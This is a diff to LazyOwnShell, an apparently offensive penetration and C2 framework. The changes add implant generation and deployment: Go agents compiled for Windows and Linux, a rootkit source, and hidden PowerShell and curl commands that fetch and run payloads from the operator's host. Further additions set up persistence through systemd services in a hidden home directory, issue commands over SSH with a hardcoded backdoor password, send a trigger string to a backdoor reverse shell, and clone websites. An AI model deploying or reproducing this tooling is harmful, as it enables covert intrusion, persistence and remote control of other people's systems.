@@ -20,6 +20,7 @@ Description: This file contains the definition of the logic in the LazyOwnShell 
 """
 
 import cmd2
+
 from utils import *
 
 class LazyOwnShell(cmd2.Cmd):
@@ -107,7 +108,6 @@ class LazyOwnShell(cmd2.Cmd):
         "event_trace": "sh sudo cat /sys/kernel/debug/tracing/trace",
         "ftpsniff": "run lazyftpsniff",
         "gdb": "set debug true",
-        "gpt": "run lazygptcli",
         "hash": "sh cat sessions/hash*",
         "hosts": "sh sudo nano /etc/hosts",
         "info": "sh echo \"<?php phpinfo(); ?>\" > sessions/info.php",
@@ -189,12 +189,15 @@ class LazyOwnShell(cmd2.Cmd):
             "wordlist": None,
             "hide_code": None,
             "mode": None,
-            "reverse_shell_port": None,
             "path": "/",
+            "reverse_shell_port": 7777,
+            "listener": 7878,
+            "c2_port": 4444,
             "rhost": None,
             "lhost": None,
             "rport": 1337,
             "lport": 1337,
+            "sleep": 6,
             "rat_key": "82e672ae054aa4de6f042c888111686a",
             "startip": "192.168.1.1",
             "endip": "192.168.1.254",
@@ -253,7 +256,10 @@ class LazyOwnShell(cmd2.Cmd):
         self.c2_auth = ("LazyOwn", "LazyOwn")
         self.c2_clientid = "no_priv"
         self.path = os.getcwd()
-
+        self.url_download = url_download
+        self.version = version
+        self.sessions_dir = f"{self.path}/sessions"
+        
     def log_command(self, cmd_name, cmd_args):
         """
         Logs the command execution details to a CSV file.
@@ -1015,7 +1021,7 @@ class LazyOwnShell(cmd2.Cmd):
             email_password,
         )
 
-    def run_lazygptcli(self):
+    def do_gpt(self, line):
         """
         Run the internal module to create Oneliners with Groq AI located at `modules/lazygptcli.py` with the specified parameters.
 
@@ -1057,14 +1063,16 @@ class LazyOwnShell(cmd2.Cmd):
             - Ensure that `modules/lazygptcli.py` has the appropriate permissions and dependencies to run.
             - The environment variable `GROQ_API_KEY` must be correctly assign for the script to function.
         """
-
-        prompt = self.params["prompt"]
+        if not line:
+            prompt = self.params["prompt"]
+        else: 
+            prompt = line.strip()
         api_key = self.params["api_key"]
         if not prompt or not api_key:
             print_error("Prompt and api_key must be assign")
             return
         os.environ["GROQ_API_KEY"] = api_key
-        self.run_script("modules/lazygptcli.py", "--prompt", prompt)
+        self.cmd(f"python3 modules/lazygptcli.py --prompt '{prompt}'")
 
     def run_lazysearch_bot(self):
         """
@@ -5595,6 +5603,7 @@ class LazyOwnShell(cmd2.Cmd):
             ("WIN Show running services", "net start"),
             ("WIN User accounts", "net user"),
             ("WIN Show computers", "net view"),
+            ("WIN AD Enum", "('AD_Computers: {0}' -f ([adsiSearcher]'(ObjectClass=computer)').FindAll().count); ([adsisearcher]'(&(objectCategory=user)(servicePrincipalName=*))').FindAll()"),
             ("WIN Post Exploit Amnesiac", f"iex(new-object net.webclient).downloadstring('http://{lhost}/Amnesiac.ps1');Amnesiac"),
             ("WIN Post Exploit AmnesiacShell", f"iex(new-object net.webclient).downloadstring('http://{lhost}/Amnesiac_ShellReady.ps1');Amnesiac"),
             ("WIN Post Exploit SMBRemoting", f"iex(new-object net.webclient).downloadstring('http://{lhost}/Invoke-SMBRemoting.ps1');Invoke-SMBRemoting -ComputerName \"{subdomain}.{domain}\""),
@@ -5648,7 +5657,7 @@ class LazyOwnShell(cmd2.Cmd):
             ("WIN ADSync", "Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\ADSync"),
             ("WIN ADSync Property","Get-ItemProperty -Path \"C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe\" | Format-list -Property * -Force"),
             ("WIN ADSync Sql",f"sqlcmd -S {subdomain} -Q \"use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration\""),
-            ("WIN LazyOwn Implant", f'Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"iwr -uri  http://{lhost}/w -OutFile z.ps1 ; .\z.ps1`""')
+            ("WIN LazyOwn Implant", f'Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"iwr -uri  http://{lhost}/w -OutFile z.ps1 ; .\z.ps1`""'),
             ("WEB linkedin.com workers scrapper", 'var employees = []; employees = employees.concat(document.getElementsByTagName("h3")); for(var i=0;i<employees[0].length;i++){ 	console.log(employees[0][i].innerHTML) }'),
             ("WEB Google site:linkedin.com/in \"Company Name\"", 'var employees = []; employees = employees.concat(document.getElementsByTagName("h3")); for(var i=0;i<employees[0].length;i++){ console.log(employees[0][i].innerHTML) }'),
             ("WEB Cady", f"{url}/admindashboard?s=aa&o=ASC%3b++select+\"ping%3b\"+INTO+OUTFILE++'/data/scripts/dbstatus.json'+%3b"),
@@ -6365,7 +6374,7 @@ class LazyOwnShell(cmd2.Cmd):
         else:
             port = line
         print_msg(f"{GREEN} Web server at sessions in port {RED} {port} {RESET}")
-        os.system(f"cd sessions && sudo python3 -m http.server {port}")
+        os.system(f"cd sessions && sudo python3 www.py {port}")
         print_msg(f"{YELLOW} Shutdown Web server at sessions in port {RED} {port} {RESET}")
         return
 
@@ -7539,19 +7548,19 @@ class LazyOwnShell(cmd2.Cmd):
             self.cmd("sudo rm sessions/scan* -rf")
             return
         exclusions = [
+            'c',
             'download_resources.sh',
-            'win',
+            'implant',
+            'ip2asn-v4.tsv.gz',
             'lin',
             'logs',
             'php',
-            'users.txt',
-            'sslscan-singleip.sh',
-            'shell.c',
-            'infect.c',
-            'pid.c',
-            'tor.sh',
             'payloads.txt',
-            'ip2asn-v4.tsv.gz'
+            'sslscan-singleip.sh',
+            'tor.sh',
+            'users.txt',
+            'win',
+            'www'
         ]
 
         # Path to the sessions directory
@@ -9646,7 +9655,6 @@ class LazyOwnShell(cmd2.Cmd):
         url = line
         limit = self.params.get("limit", 10)
 
-        # Constructing the request URL
         wayback_url = (
             f"https://web.archive.org/cdx/search?url={url}&matchType=prefix&collapse=urlkey&output=text&fl=original&filter=&limit={limit}"
         )
@@ -9665,7 +9673,6 @@ class LazyOwnShell(cmd2.Cmd):
 
             print_msg(f"{GREEN}############ All websites from the WayBack Machine ###########")
 
-            # Printing the results
             for j, i in enumerate(results.split(), start=1):
                 print_msg(f"{j} : {i}")
             print_msg(f"{CYAN}https://web.archive.org/web/*/{line}/*")
@@ -9681,7 +9688,7 @@ class LazyOwnShell(cmd2.Cmd):
         This function performs the following tasks:
         1. Retrieves and validates the local host (lhost) and local port (lport) parameters.
         2. Checks if the required file `modules/run` exists.
-        3. Reads the content of the `modules/run` file, replaces placeholders with actual values (lport, line, lhost), 
+        3. Reads the content of the `modules/run` file, replaces placeholders with actual values (lport, line, lhost),
         and copies the updated content to the clipboard.
         4. Prompts the user to start the C2 server, and if confirmed, executes the server command.
         5. Provides a warning about shutting down the server.
@@ -9696,74 +9703,115 @@ class LazyOwnShell(cmd2.Cmd):
             None
 
         Example:
-            c2 victim-1
+            c2 victim 1
 
         Notes:
             - Ensure that the `lhost` and `lport` parameters are valid before calling this function.
             - The `modules/run` file must exist and be correctly formatted.
             - The server command is executed using `os.system`, which may require additional handling for security.
         """
+
+        if line:
+            args = line.split()
+            print(len(args))
+            if len(args) == 1:
+                line = args[0]
+                choice = None
+            elif len(args) == 2:
+                line = args[0]
+                choice = args[1]
+            else:
+                print_error("You need to specify the victim-id, for example: c2 victim-1. [1 win ps1 | 2 linux | 3 win bat] ")
+                return
+        else:
+            print_error("You need to specify the victim-id, for example: c2 victim-1. [1 win ps1 | 2 linux | 3 win bat] ")
+            return
+
         lhost = self.params["lhost"]
-        lport = self.params["reverse_shell_port"]
+        lport = str(self.params["c2_port"])
+        rport = str(self.params["rport"])
+        listener = str(self.params["listener"])
+        sleep = str(self.params["sleep"])
         path = os.getcwd()
         file = f"{path}/modules/run"
         wfile = f"{path}/sessions/win/lazybot.ps1"
         bfile = f"{path}/modules/run.bat"
         filek = f"{path}/modules/backdoor/backdoor.c"
         files = f"{path}/modules/backdoor/server.c"
+        cfiles = f"{path}/modules/rootkit/monrev.c"
+        file_evil = f"{path}/modules/evilhttprev.sh"
         filer = f"{path}/modules/r.sh"
-        self.c2_url= f"http://{lhost}:{lport}"
+        gofile = f"{path}/sessions/implant/implant.go"
+        gofile2 = f"{path}/sessions/implant/listener.go"
+        implantgo = f"{path}/sessions/{line}"
+        implantgo2 = f"{path}/sessions/l_{line}"
+        self.c2_url = f"http://{lhost}:{lport}"
         self.c2_clientid = line.strip()
         USER = "LazyOwn"
         PASS = "LazyOwn"
         self.c2_auth = (USER, PASS)
         random_bytes = os.urandom(100)
         base64_encoded = base64.b64encode(random_bytes)
-        random_string = base64_encoded.decode('utf-8')[:12] 
-
+        random_string = base64_encoded.decode('utf-8')[:12]
+        working_dir = f"{path}/sessions/"
         if not check_lhost(lhost):
             return
 
         if not check_lport(lport):
             return
-        
-        if not line:
-            print_error("You need to specify the victim-id, for example: c2 victim-1.")
-            return
-        
+
+
         if not is_exist(file):
             return
 
         with open(file, 'r') as f:
             content = f.read()
         
+        with open(cfiles, 'r') as f:
+            content_mon = f.read()
+
         if not is_exist(wfile):
             return
         with open(wfile, 'r') as f:
             wcontent = f.read()
+
         with open(bfile, 'r') as f:
             bcontent = f.read()
+
+        with open(file_evil, 'r') as f:
+            evil_content = f.read()
+        content_mon = content_mon.replace("{lport}", str(rport)).replace("{line}", line).replace("{lhost}", lhost)
         bcontent = bcontent.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost)
-        wcontent = wcontent.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}",USER).replace("{password}",PASS)
-        content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}",USER).replace("{password}",PASS)
+        wcontent = wcontent.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{sleep}", sleep)
+        content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{sleep}", sleep)
+        evil_content = evil_content.replace("{lport}", str(rport)).replace("{line}", line).replace("{lhost}", lhost).replace("{listener}", listener)
+
         server = f"python3 -W ignore lazyc2.py {lport} {USER} {PASS}"
-        
+
+        with open("sessions/monrev.c", 'w+') as f:
+            f.write(content_mon)
+
         with open("sessions/r", 'w+') as f:
             f.write(content)
-        
+
         with open("sessions/w", 'w+') as f:
             f.write(wcontent)
 
         with open("sessions/r.bat", 'w+') as f:
             f.write(bcontent)
-        choice = input("    [!] choice target windows 1, linux 2, windows bat 3 (default 1) : ") or '1'
+
+        if not choice:
+            choice = input("    [!] choice target windows 1, linux 2, windows bat 3 (default 1) : ") or '1'
 
         if choice == '1':
             copy2clip(f"Start-Process powershell -ArgumentList \"-NoProfile -WindowStyle Hidden -Command `\"iwr -uri  http://{lhost}/w -OutFile z.ps1 ; .\\z.ps1`\"\"")
+            platform = "windows"
         elif choice == '2':
             copy2clip(f"curl http://{lhost}/r -o r && sh r")
+            platform = "linux"
         elif choice == '3':
             copy2clip(f"iwr -uri  http://{lhost}/b.bat -OutFile b.bat ; .\\b.bat")
+            platform = "windows"
 
         with open(filek, 'r') as f:
             content = f.read()
@@ -9771,9 +9819,14 @@ class LazyOwnShell(cmd2.Cmd):
         content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost)
         with open("sessions/b.c", 'w+') as f:
             f.write(content)
-        
+
         with open(files, 'r') as f:
             content = f.read()
+
+        with open(f"sessions/listener_{line}.sh", 'w+') as f:
+            f.write(evil_content)
+        
+        print_msg(f"curl -o l_{line} http://{lhost}/listener_{line}.sh ; chmod +x l_{line}.sh ; ./l_{line}.sh &")
 
         content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost)
         with open("sessions/server.c", 'w+') as f:
@@ -9784,10 +9837,53 @@ class LazyOwnShell(cmd2.Cmd):
         contentr = contentr.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost)
         with open("sessions/r.sh", 'w+') as f:
             f.write(contentr)
-        if is_port_in_use(lport):
+
+        with open(gofile, 'r') as f:
+            content = f.read()
+
+        with open(gofile2, 'r') as f:
+            lcontent = f.read()
+
+        content = content.replace("{lport}", str(lport)).replace("{line}", line).replace("{lhost}", lhost).replace("{username}", USER).replace("{password}", PASS).replace("{platform}", platform).replace("{sleep}", sleep)
+        lcontent = lcontent.replace("{lport}", str(rport)).replace("{lhost}", lhost).replace("{listener}", listener)
+        implant_go = implantgo + ".go"
+        implant_go2 = implantgo + "_l.go"
+        if platform == "windows":
+            implantgo += ".exe"
+            implantgo2 += "_l.exe"
+        with open(implant_go, 'w+') as f:
+            f.write(content)
+        
+        with open(f"{implant_go2}", 'w+') as f:
+            f.write(lcontent)
+        
+        if platform == "linux":
+            compile_command = f"GOOS=linux GOARCH=amd64 go build -o {implantgo} {implant_go}"
+            compile_command2 = f"GOOS=linux GOARCH=amd64 go build -o {implantgo2} {implant_go2}"
+            command_curl = f"curl -o {line} http://{lhost}/{line} ; chmod +x {line} ; ./{line} &"
+            command_curl2 = f"curl -o l_{line} http://{lhost}/l_{line} ; chmod +x l_{line} ; ./l_{line} &"
+            command_mon = f"gcc -o {self.sessions_dir}/monrev {self.sessions_dir}/monrev.c -lpthread"
+            self.cmd(command_mon)
+            self.onecmd(f"upload_c2 {self.sessions_dir}/monrev")
+            print_msg(command_curl)
+            print_msg(command_curl2)
+            self.onecmd(f"ssh_cmd {command_curl}")
+            self.onecmd(f"ssh_cmd {command_curl2}")
+            self.onecmd(f"service {line}")
+            self.onecmd(f"service l_{line}")
+        elif platform == "windows":
+            compile_command = f"GOOS=windows GOARCH=amd64 go build -o {implantgo} {implant_go}"
+            compile_command2 = f"GOOS=windows GOARCH=amd64 go build -o {implantgo2} {implant_go2}"
+            print_msg(f"Start-Process powershell -ArgumentList \"-NoProfile -WindowStyle Hidden -Command `\"iwr -uri  http://{lhost}/{implant_go} -OutFile {implant_go} ; .\\{implant_go}`\"\"")
+            print_msg(f"Start-Process powershell -ArgumentList \"-NoProfile -WindowStyle Hidden -Command `\"iwr -uri  http://{lhost}/{implant_go2} -OutFile {implant_go2} ; .\\{implant_go2}`\"\"")
+        self.cmd(compile_command)
+        self.cmd(compile_command2)
+        print_msg(f"Go agent {implantgo} compiled successfully.")
+        
+        if is_port_in_use(int(lport)):
             command = "cp modules/backdoor/*.h sessions && cd sessions && x86_64-w64-mingw32-gcc -o b.exe b.c -lwininet -lwsock32 && gcc -o server server.c && cd .."
             self.cmd(command)
-            print_msg(f"Agent {line} Crafted.")
+            print_msg(f"Agent {line}/{platform} Crafted.")
         else:
             choice = input(f"    {CYAN}[?] start C2 Server ? (yes/no): ") or 'yes'
             if choice == 'yes':
@@ -9798,6 +9894,7 @@ class LazyOwnShell(cmd2.Cmd):
                 self.cmd(server)
 
                 print_warn(f"Shutdown Server C&C at port:{RED} {lport}")
+
         return
 
     def do_kick(self, line):
@@ -17096,6 +17193,7 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f"{BLUE}{UNDERLINE}https://talosintelligence.com/reputation_center/lookup?search={ip_address}")
         print_msg(f"{BLUE}{UNDERLINE}https://www.abuseipdb.com/check/{ip_address}")
         print_msg(f"{BLUE}{UNDERLINE}https://whatismyipaddress.com/ip/{ip_address}")
+        self.onecmd(f"ipinfo {ip_address}")
         for p in ports.split(","):
             print_msg(f"{BLUE}{UNDERLINE}https://www.speedguide.net/port.php?port={p}")
             telnet = f"telnet {ip_address} {p}"
@@ -22183,15 +22281,15 @@ class LazyOwnShell(cmd2.Cmd):
             None
         """
         try:
-            print_msg("Installing and configuring apt-cacher-ng...")
-            subprocess.run(["sudo", "apt-get", "update"], check=True)
-            subprocess.run(["sudo", "apt-get", "install", "-y", "apt-cacher-ng"], check=True)
+            if not is_binary_present("apt-cacher-ng"):
+                print_warn("Installing and configuring apt-cacher-ng...")
+                subprocess.run(["sudo", "apt-get", "update"], check=True)
+                subprocess.run(["sudo", "apt-get", "install", "-y", "apt-cacher-ng"], check=True)
+
             subprocess.run(["sudo", "systemctl", "start", "apt-cacher-ng"], check=True)
             subprocess.run(["sudo", "systemctl", "enable", "apt-cacher-ng"], check=True)
-            if line:
-                remote_ip = line.strip()
-            else:
-                remote_ip = self.params["rhost"]
+
+            remote_ip = self.params["rhost"]
             if not remote_ip:
                 print_error("No IP address provided. Please provide the IP address of the remote machine without internet access.")
                 return
@@ -22207,8 +22305,14 @@ class LazyOwnShell(cmd2.Cmd):
             commands_str = "\n".join(commands)
             copy2clip(commands_str)
 
+            if line.startswith("remote"):
+                ssh_command = f"""bash -c '{commands_str}' &"""
+                self.issue_command_to_c2(ssh_command)
+
             print_msg("APT proxy configured successfully.")
             print_msg("Commands to configure the remote machine have been copied to the clipboard.")
+        except Exception as e:
+            print_error(f"An error occurred: {e}")
 
         except subprocess.CalledProcessError as e:
             print_error(f"Command failed: {e.cmd}")
@@ -22234,9 +22338,11 @@ class LazyOwnShell(cmd2.Cmd):
             None
         """
         try:
-            print_msg("Installing and configuring squid...")
-            subprocess.run(["sudo", "apt-get", "update"], check=True)
-            subprocess.run(["sudo", "apt-get", "install", "-y", "squid"], check=True)
+            if not is_binary_present("squid"):
+                print_warn("Installing and configuring squid...")
+                subprocess.run(["sudo", "apt-get", "update"], check=True)
+                subprocess.run(["sudo", "apt-get", "install", "-y", "squid"], check=True)
+
             subprocess.run(["sudo", "systemctl", "start", "squid"], check=True)
             subprocess.run(["sudo", "systemctl", "enable", "squid"], check=True)
 
@@ -22253,13 +22359,14 @@ class LazyOwnShell(cmd2.Cmd):
             proxy_config_file = "/etc/pip.conf"
 
             commands = [
-                f"echo '{proxy_config}' | sudo tee {proxy_config_file}",
+                f"echo \'{proxy_config}\' | sudo tee {proxy_config_file}",
                 f"pip install --upgrade pip --trusted-host {self.params['lhost']}"
             ]
 
             commands_str = "\n".join(commands)
             copy2clip(commands_str)
-
+            if line.startswith("remote"):
+                self.issue_command_to_c2(commands_str)
             print_msg("pip proxy configured successfully.")
             print_msg("Commands to configure the remote machine have been copied to the clipboard.")
 
@@ -22286,9 +22393,10 @@ class LazyOwnShell(cmd2.Cmd):
             None
         """
         try:
-            print_msg("Installing and configuring squid...")
-            subprocess.run(["sudo", "apt-get", "update"], check=True)
-            subprocess.run(["sudo", "apt-get", "install", "-y", "squid"], check=True)
+            print_warn("Installing and configuring squid...")
+            if not is_binary_present("squid"):
+                subprocess.run(["sudo", "apt-get", "update"], check=True)
+                subprocess.run(["sudo", "apt-get", "install", "-y", "squid"], check=True)
             subprocess.run(["sudo", "systemctl", "start", "squid"], check=True)
             subprocess.run(["sudo", "systemctl", "enable", "squid"], check=True)
 
@@ -22681,13 +22789,14 @@ class LazyOwnShell(cmd2.Cmd):
         shellcode = get_users_dic("c")
         name_shell = "shell.c"
         name_shell_inf = "infect.c"
-        sessions = f"{path}/sessions"
+        sessions = f"{path}/sessions/c"
         infect_pid = f"{sessions}/{name_shell_inf}"
         pid = "pid.c"
         pid_pid = f"{sessions}/{pid}"
         shellsrc = f"{sessions}/{name}"
         shell = f"{sessions}/{name_shell}"
-        elf = f"{sessions}/{name.replace(".c","")}"
+        name_clean = name.replace(".c","")
+        elf = f"{sessions}/{name_clean}"
         final_infect = f"{sessions}/{nameinfect}"
         with open(shellcode, 'r') as f:
             content_shellcode = f.read().strip()
@@ -22719,9 +22828,12 @@ class LazyOwnShell(cmd2.Cmd):
         self.upload_file_to_c2(final_infect)
         self.upload_file_to_c2(elf)
         self.upload_file_to_c2(f"{elf}_infect")
-
-        command = f"gcc -o {elf.replace(f"{sessions}/","")} {shellsrc.replace(f"{sessions}/","")} -fno-stack-protector -z execstack"
-        command_infect = f"gcc -o {elf.replace(f"{sessions}/","")}_infect {final_infect.replace(f"{sessions}/","")} -fno-stack-protector -z execstack"
+        sessions_slash = f"{sessions}/"
+        elf_replace = elf.replace(sessions_slash,"")
+        shellsrc_clean = shellsrc.replace(sessions_slash,"")
+        infect_clean = final_infect.replace(sessions_slash,"")
+        command = f"gcc -o {elf_replace} {shellsrc_clean} -fno-stack-protector -z execstack"
+        command_infect = f"gcc -o {elf_replace}_infect {infect_clean} -fno-stack-protector -z execstack"
 
         self.issue_command_to_c2(command)
         self.issue_command_to_c2(command_infect)
@@ -22730,7 +22842,464 @@ class LazyOwnShell(cmd2.Cmd):
 
         copy2clip(command)
         return
+
+    def do_ssh_cmd(self, line):
+        """
+        Perform Remote Execution Command trow ssh using grisun0 user, see help grisun0
+
+        Parameters:
+            line (str): The command line input, is the command to execute, if not presented is whoami
+
+        Returns:
+            None
+        """
+        if not line:
+            line = "whoami"
+        rhost = self.params["rhost"]
+        username = "grisun0"
+        password = "grisgrisgris"
+        print_msg(f"Executing ... {line}")
+        ssh = f"""sshpass -p '{password}' ssh {username}@{rhost} 'echo "{password}" | sudo -S {line}'"""
+        self.cmd(ssh)
+        return
+
+    def do_clone_site(self, line):
+        """Clone a website and serve the files in sessions/{url_cloned}.
+        Args:
+            line (str): input line that url to clone
+
+        Returns:
+            None
+        """
+        if not line:
+            url = self.params["url"]
+        else:
+            url = line.strip()
+        useragent = "some user agent"
+        url_cloned = url.replace("https://", "").replace("http://", "").replace("/", "_").replace(".", "_")
+        session_path = f"sessions/{url_cloned}"
+
+        if os.path.isdir(session_path):
+            for filename in glob.glob(os.path.join(session_path, "*")):
+                if os.path.isdir(filename):
+                    shutil.rmtree(filename)
+                else:
+                    os.remove(filename)
+        else:
+            os.makedirs(session_path)
+
+        print_msg("Cloning website: " + url)
+        try:
+            web_request = requests.get(url, headers={'User-Agent': useragent}, verify=False)
+            if web_request.status_code != 200 or len(web_request.content) < 1:
+                print_error("Unable to clone the site. Status Code: %s" % web_request.status_code)
+                sys.exit()
+
+            with open(os.path.join(session_path, "index.html"), 'wb') as fh:
+                fh.write(web_request.content)
+
+        except requests.ConnectionError:
+            print_error("Unable to clone website due to connection issue (are you connected to the Internet?), writing a default one for you...")
+            with open(os.path.join(session_path, "index.html"), "w") as fh:
+                fh.write("<head></head><html><body>It Works!</body></html>")
+
+        if os.path.isfile(os.path.join(session_path, "index.html")):
+            print_msg("Site cloned successfully.")
+
+    def do_knokknok(self, line):
+        """Send special string to trigger a reverse shell, with the command 'c2 client_name'
+        create a listener shell script to drop the reverse shell in python3
+        Args:
+            line (str): input line not used
+
+        Returns:
+            None
+        """        
+        HOST = self.params["rhost"]
+        if line:
+            PORT = line.strip()
+        else:
+            PORT = self.params["rport"]
+        print_msg(f"KnokKnok backdoor on {HOST} {PORT}")
+        especial_cadena = "grisiscomebacksayknokknok"
+        try:
+            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            client_socket.connect((HOST, int(PORT)))
+            client_socket.sendall(especial_cadena.encode('utf-8'))
+            client_socket.close()
+            print_msg("Who is ?")
+        except Exception:
+            print_error("Listener is not listen.")
+        return
     
+    def do_listener_go(self, line):
+        """
+        Configures and starts a listener for a specified victim.
+
+        This function takes a command line input to configure and start a listener for a specified victim.
+        The input should include the victim ID, the choice of listener type, and optionally the port numbers.
+        The function then constructs the appropriate command to start the listener and assigns the necessary
+        parameters.
+
+        Args:
+            line (str): The command line input containing the victim ID, listener type, and optional port numbers.
+
+        Returns:
+            None
+
+        Raises:
+            None
+
+        Example:
+            >>> listener_go victim1 2 1337 7777
+        """
+        if line:
+            args = line.split()
+
+            if len(args) == 1:
+                line = args[0]
+                choice = None
+                print_error("1 You need to specify the victim-id, for example: listener victim. (1 win ps1 | 2 linux | 3 win bat) 1337 (port listener nc) ")
+                return
+            elif len(args) == 2:
+                line = args[0]
+                choice = args[1]
+                port = '6666'
+                listener = '7777'
+            elif len(args) == 3:
+                line = args[0]
+                choice = args[1]
+                port =  args[2]
+                listener = '7777'
+            elif len(args) == 4:
+                line = args[0]
+                choice = args[1]
+                port =  args[2]
+                listener = args[3]
+            else:
+                print_error("2 You need to specify the victim-id, for example: listener victim. (1 win ps1 | 2 linux | 3 win bat) 1337 remote listen ")
+                return
+        else:
+            print_error("3 You need to specify the victim-id, for example: listener victim. (1 win ps1 | 2 linux | 3 win bat) 1337 remote listen 6666 (port listener nc) ")
+            return
+        
+        lhost = self.params["lhost"]  
+        implant_go2 = f"l_{line}_l.exe"
+        if choice == "2":
+            command = f"curl -o /home/grisun0/l_{line} http://{lhost}/l_{line} && sudo -S chmod +x /home/grisun0/l_{line} && sudo -S nohup /home/grisun0/l_{line} & \\n"
+        else:
+            command = f"Start-Process powershell -ArgumentList \"-NoProfile -WindowStyle Hidden -Command `\"iwr -uri  http://{lhost}/{implant_go2} -OutFile {implant_go2} ; .\\{implant_go2}`\"\""
+
+        self.onecmd(f'assign rport {port}')
+        self.onecmd(f'assign lport {port}')
+        self.onecmd(f'assign listener {listener}')
+        self.onecmd(f'c2 {line} {choice}')
+        self.onecmd(f'ssh_cmd {command}')
+        self.onecmd(f'nc {listener}')
+        return
+
+    def do_listener_py(self, line):
+        """
+        Configures and starts a listener for a specified victim.
+
+        This function takes a command line input to configure and start a listener for a specified victim.
+        The input should include the victim ID, the choice of listener type, and optionally the port numbers.
+        The function then constructs the appropriate command to start the listener and assigns the necessary
+        parameters.
+
+        Args:
+            line (str): The command line input containing the victim ID, listener type, and optional port numbers.
+
+        Returns:
+            None
+
+        Raises:
+            None
+
+        Example:
+            >>> listener_py victim1 2 1337 7777
+        """
+        if line:
+            args = line.split()
+
+            if len(args) == 1:
+                line = args[0]
+                choice = None
+                print_error("1 You need to specify the victim-id, for example: listener victim. (1 win ps1 | 2 linux | 3 win bat) 1337 (port listener nc) ")
+                return
+            elif len(args) == 2:
+                line = args[0]
+                choice = args[1]
+                port = '6666'
+                listener = '7777'
+            elif len(args) == 3:
+                line = args[0]
+                choice = args[1]
+                port =  args[2]
+                listener = '7777'
+            elif len(args) == 4:
+                line = args[0]
+                choice = args[1]
+                port =  args[2]
+                listener = args[3]
+            else:
+                print_error("2 You need to specify the victim-id, for example: listener victim. (1 win ps1 | 2 linux | 3 win bat) 1337 remote listen ")
+                return
+        else:
+            print_error("3 You need to specify the victim-id, for example: listener victim. (1 win ps1 | 2 linux | 3 win bat) 1337 remote listen 6666 (port listener nc) ")
+            return
+        
+        lhost = self.params["lhost"]  
+  
+        if choice == "2":
+            command = f"curl -o /home/.grisun0/l_{line}.sh http://{lhost}/listener_{line}.sh && sudo -S chmod +x /home/.grisun0/l_{line}.sh && sudo -S nohup /bin/bash /home/.grisun0/l_{line}.sh & \\n"
+        else:
+            command = f"Start-Process powershell -ArgumentList \"curl -o l_{line}.sh http://{lhost}/listener_{line}.sh ; chmod +x l_{line}.sh ; ./l_{line}.sh &\""
+
+        self.onecmd(f'assign rport {port}')
+        self.onecmd(f'assign lport {port}')
+        self.onecmd(f'assign listener {listener}')
+        self.onecmd(f'c2 {line} {choice}')
+        self.onecmd(f'ssh_cmd {command}')
+        self.onecmd(f'nc {listener}')
+        return
+
+    def do_ipinfo(self, line):
+        """
+        Retrieves detailed information about an IP address using the ARIN API.
+
+        This function takes an IP address as input, queries the ARIN API to get detailed
+        information about the IP, and then displays the organization name and the network
+        range associated with the IP.
+
+        Args:
+            line (str): The command line input containing the IP address to query.
+
+        Returns:
+            None
+
+        Raises:
+            None
+
+        Example:
+            >>> ipinfo 1.1.1.1
+        """        
+        ip = line.strip()
+        if not ip:
+            print_error("Error: Por favor, proporciona una dirección IP.")
+            return
+
+        data = query_arin_ip(ip)
+        if not data:
+            print_error(f"No se encontró información para la IP: {ip}")
+            return
+
+        if not data.get("net"):
+            print_error(f"Formato de respuesta inesperado de la API de ARIN para la IP: {ip}")
+            return
+
+        name = get_org(data)
+        try:
+            net_blocks = data.get("net", {}).get("netBlocks", [])
+            if net_blocks:
+                netblock = net_blocks[0].get("netBlock", {})
+                start_address = netblock.get("$", {}).get("startAddress")
+                cidr_length = netblock.get("$", {}).get("cidrLength")
+
+                if start_address and cidr_length:
+                    range = f"{start_address}/{cidr_length}"
+                else:
+                    range = "N/A (Error incomplete info)"
+            else:
+                range = "N/A (No network blocks)"
+        except (KeyError, AttributeError, IndexError) as e:
+            print_warn(f"Error IP: {ip}. Error code: {e}")
+            range = "N/A (Error)"
+
+        print_msg(f"[!] {ip}")
+        print_msg(f" |_ {name}")
+        print_msg(f" \_ {range}")
+        return 
+
+    def do_service(self, line):
+        """
+        Creates a systemd service file for a specified binary and generates a script to enable and start the service.
+
+        This function takes the name of a binary as input, creates a systemd service file for it, and generates a shell script
+        to enable and start the service. The script is saved in the sessions directory and a command is provided to execute
+        the script remotely via SSH.
+
+        Args:
+            line (str): The command line input containing the name of the binary. If an absolute path is not provided,
+                        a default path is used.
+
+        Returns:
+            None
+
+        Raises:
+            None
+
+        Example:
+            >>> service my_binary_name
+        """    
+        binary_name = line.strip()
+        lhost = self.params["lhost"]
+        if not binary_name:
+            print_error("No binary name provided.")
+            return
+
+        default_path = f"/home/.grisun0/services/{binary_name}"
+        binary_path = default_path if not os.path.isabs(binary_name) else binary_name
+
+        service_content = f"""#!/bin/bash
+        SOURCE_FILE="{line}.service"
+        cat > $SOURCE_FILE <<EOL
+        [Unit]
+        Description=My Custom Service for {binary_name}
+        After=network.target
+
+        [Service]
+        ExecStart={binary_path}
+        WorkingDirectory=/home/.grisun0/services
+        StandardOutput=inherit
+        StandardError=inherit
+        Restart=always
+        User=nobody
+
+        [Install]
+        WantedBy=multi-user.target
+        EOL
+        sudo cp {binary_name}.service /etc/systemd/system/{binary_name}.service && 
+        sudo systemctl daemon-reload && 
+        sudo systemctl start {binary_name} && 
+        sudo systemctl enable {binary_name}
+        """.replace('        ','')
+
+        service_file_path = os.path.join(self.sessions_dir, f"{binary_name}_service.sh")
+
+        try:
+            with open(service_file_path, "w") as service_file:
+                service_file.write(service_content)
+            print_msg(f"Service file created at {service_file_path}")
